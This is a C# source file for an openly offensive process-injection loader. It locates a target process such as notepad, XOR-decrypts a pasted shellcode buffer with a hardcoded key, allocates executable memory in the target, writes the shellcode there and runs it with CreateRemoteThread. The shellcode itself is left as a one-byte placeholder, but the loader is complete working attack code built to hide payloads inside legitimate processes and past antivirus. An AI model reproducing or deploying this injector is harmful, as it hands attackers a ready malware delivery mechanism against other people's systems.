using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace XORedReflectiveDLL
{
    public class ReflectiveDLL
    {
        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        #region Reflective DLL Injection flags
        //http://www.pinvoke.net/default.aspx/kernel32/OpenProcess.html
        public enum ProcessAccessRights
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
        public enum MemAllocation
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x1000000,
            SecCommit = 0x08000000
        }

        //https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
        public enum MemProtect
        {
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
        }

        #endregion

        public int SearchForTargetID(string process)
        {
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                    {
                        pid = proc.Id;
                        Console.WriteLine($"[+] Target process ID found: {pid}.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
                Console.WriteLine(ex.Message);
            }
            return pid;
        }

        //https://stackoverflow.com/questions/3710132/byte-array-cryptography-in-c-sharp

        public static byte[] XorDecrypt(byte[] shellcode, string key)
        {
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)(shellcode[i] ^ key[i % key.Length]);
            }

            return shellcode;
        }

        public static void XORedReflectiveDLLInject(int targetId, byte[] buffer)
        {
            try
            {
                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                IntPtr lpThreadId = IntPtr.Zero;


                IntPtr procHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)targetId);
                Console.WriteLine($"[+] Getting the handle for the target process: {procHandle}.");
                IntPtr remoteAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)buffer.Length, (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
                Console.WriteLine($"[+] Allocating memory in the remote process {remoteAddr}.");
                Console.WriteLine($"[+] Writing shellcode at the allocated memory location.");
                if (WriteProcessMemory(procHandle, remoteAddr, buffer, (uint)buffer.Length, out lpNumberOfBytesWritten))
                {
                    Console.WriteLine($"[+] Shellcode written in the remote process.");
                    CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                }
                else
                {
                    Console.WriteLine($"[+] Failed to inject shellcode.");
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        static void Main(string[] args)
        {
            // Change XOR key and target Process
            string key = "This1sTheK3y";
            string targetProccess = "notepad";

            ReflectiveDLL reflect = new ReflectiveDLL();
            int targetProccessId = 0;
            targetProccessId = reflect.SearchForTargetID(targetProccess);

            // Paste the XORED shellcode below
            byte[] xoredbuffer = { 0xab, };

            byte[] realbuffer;
            realbuffer = XorDecrypt(xoredbuffer, key);
            XORedReflectiveDLLInject(targetProccessId, realbuffer);

        }
    }
}